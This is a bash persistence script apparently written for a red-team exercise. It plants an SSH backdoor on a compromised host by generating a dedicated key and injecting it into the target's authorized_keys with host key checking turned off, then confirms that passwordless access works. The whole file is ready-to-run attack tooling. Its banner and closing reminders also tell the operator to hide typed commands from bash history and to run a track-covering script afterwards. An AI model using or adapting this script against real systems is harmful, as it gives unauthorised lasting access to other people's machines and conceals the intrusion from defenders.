#!/bin/bash

# =======================================================
#   IRTx Red Team - Persistence Script
#   Author: DataTrust Red Team
#   Description: Establishes SSH backdoor via public key
#                injection into compromised target host.
#   Run from: Kali (Red Team Machine)
# =======================================================

# --- Colours ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗"
echo "  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝"
echo "  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   "
echo "  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   "
echo "  ██║     ███████╗██║  ██║███████║██║███████║   ██║   "
echo "  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   "
echo -e "${CYAN}        IRTx Red Team — Persistence Script${RESET}"
echo -e "${YELLOW}                   DataBreach${RESET}"
echo ""

# Add this reminder at the top after banner
echo -e "${RED}[!] Always run as root: sudo ./persistence.sh${RESET}"
echo -e "${YELLOW}    Key will be saved to /root/.ssh/irtx_backdoor${RESET}"
echo -e "${YELLOW}    Always reconnect with: sudo ssh -i /root/.ssh/irtx_backdoor...${RESET}"
echo ""

# --- Space-before-commands warning ---
echo -e "${BOLD}${YELLOW}  ╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${YELLOW}  ║  OPSEC REMINDER — From this point forward:      ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Use a SPACE before every command you type       ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  manually so it is excluded from bash history.   ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Example:  [SPACE]ssh root@10.30.0.235           ║${RESET}"
echo -e "${BOLD}${YELLOW}  ╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# --- Root check ---
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root. Use sudo.${RESET}"
    exit 1
fi

# --- Dependency checks ---
for tool in ssh-keygen ssh-copy-id ssh; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}[!] $tool is not installed. Run: sudo apt install openssh-client${RESET}"
        exit 1
    fi
done

echo -e "${GREEN}[+] All dependencies found.${RESET}"
echo ""

# =======================================================
# STEP 1: COLLECT TARGET DETAILS
# =======================================================
echo -e "${MAGENTA}[>] Step 1: Target Details${RESET}"
echo ""

echo -e "${YELLOW}[?] Enter the compromised target IP address:${RESET}"
read -r TARGET_IP

echo -e "${YELLOW}[?] Enter the username on the target (e.g. root, msfadmin):${RESET}"
read -r TARGET_USER

echo -e "${YELLOW}[?] Enter the SSH port on the target (default: 22):${RESET}"
read -r SSH_PORT
SSH_PORT=${SSH_PORT:-22}

echo ""
echo -e "${CYAN}[*] Target  : ${BOLD}$TARGET_USER@$TARGET_IP:$SSH_PORT${RESET}"
echo ""

# =======================================================
# STEP 2: GENERATE SSH KEY PAIR ON KALI
# Creates a dedicated IRTx keypair so we don't mix with
# existing Kali keys. Saved to ~/.ssh/irtx_backdoor
# =======================================================
echo -e "${MAGENTA}[>] Step 2: Generating SSH Key Pair on Kali ...${RESET}"
echo ""

KEY_PATH="$HOME/.ssh/irtx_backdoor"

if [ -f "$KEY_PATH" ]; then
    echo -e "${YELLOW}[~] Key already exists at $KEY_PATH${RESET}"
    echo -e "${YELLOW}[?] Overwrite existing key? (y/n):${RESET}"
    read -r OVERWRITE
    if [[ "$OVERWRITE" =~ ^[Yy]$ ]]; then
        rm -f "$KEY_PATH" "$KEY_PATH.pub"
        echo -e "${CYAN}[*] Old key removed.${RESET}"
    else
        echo -e "${GREEN}[+] Using existing key.${RESET}"
    fi
fi

if [ ! -f "$KEY_PATH" ]; then
    ssh-keygen -t rsa -b 4096 \
        -f "$KEY_PATH" \
        -N "" \
        -C "irtx-redteam-backdoor" \
        -q
    echo -e "${GREEN}[+] Key pair generated:${RESET}"
    echo -e "    ${CYAN}Private key : $KEY_PATH${RESET}"
    echo -e "    ${CYAN}Public key  : $KEY_PATH.pub${RESET}"
fi

echo ""

# =======================================================
# STEP 3: INJECT PUBLIC KEY INTO TARGET
# Uses ssh-copy-id to push the public key into the
# target's authorized_keys file.
# The operator will need to enter the target password
# once — after this, password is no longer needed.
# =======================================================
echo -e "${MAGENTA}[>] Step 3: Injecting Public Key into Target ...${RESET}"
echo ""
echo -e "${YELLOW}[!] You will be prompted for the target's SSH password once.${RESET}"
echo -e "${YELLOW}    After this, password login will no longer be required.${RESET}"
echo ""

ssh-copy-id -i "$KEY_PATH.pub" \
    -p "$SSH_PORT" \
    -o StrictHostKeyChecking=no \
    "$TARGET_USER@$TARGET_IP"

if [ $? -ne 0 ]; then
    echo ""
    echo -e "${RED}[!] Key injection failed.${RESET}"
    echo -e "${YELLOW}    Possible reasons:${RESET}"
    echo -e "    ${CYAN}► SSH service not running on target${RESET}"
    echo -e "    ${CYAN}► Incorrect username or password${RESET}"
    echo -e "    ${CYAN}► Target firewall blocking port $SSH_PORT${RESET}"
    exit 1
fi

echo ""
echo -e "${GREEN}[+] Public key successfully injected into $TARGET_USER@$TARGET_IP${RESET}"
echo ""

# =======================================================
# STEP 4: VERIFY BACKDOOR — TEST PASSWORDLESS SSH
# Attempts a connection using the private key only.
# If successful, the backdoor is confirmed working.
# =======================================================
echo -e "${MAGENTA}[>] Step 4: Verifying Backdoor Connection ...${RESET}"
echo ""

ssh -i "$KEY_PATH" \
    -p "$SSH_PORT" \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 \
    "$TARGET_USER@$TARGET_IP" \
    "echo '[+] Backdoor confirmed — connected as: \$(whoami) on \$(hostname)'"

if [ $? -eq 0 ]; then
    echo ""
    echo -e "${GREEN}[+] Backdoor verified and working!${RESET}"
else
    echo ""
    echo -e "${RED}[!] Verification failed — connection did not succeed.${RESET}"
    echo -e "${YELLOW}    Try manually: ssh -i $KEY_PATH -p $SSH_PORT $TARGET_USER@$TARGET_IP${RESET}"
fi

echo ""

# =======================================================
# FINAL SUMMARY
# =======================================================
echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${GREEN}  Persistence Established!${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${YELLOW}Target          :${RESET} $TARGET_USER@$TARGET_IP:$SSH_PORT"
echo -e "  ${YELLOW}Private key     :${RESET} $KEY_PATH"
echo -e "  ${YELLOW}Public key      :${RESET} $KEY_PATH.pub"
echo -e "  ${YELLOW}Re-connect with :${RESET} ssh -i $KEY_PATH -p $SSH_PORT $TARGET_USER@$TARGET_IP"
echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${BOLD}${YELLOW}  OPSEC REMINDER:${RESET}"
echo -e "${YELLOW}  ► Use SPACE before all manual commands to suppress history${RESET}"
echo -e "${YELLOW}  ► Run cover_tracks.sh after completing all objectives${RESET}"
echo -e "${YELLOW}  ► Do not leave the private key on shared systems${RESET}"
echo ""

exit 0
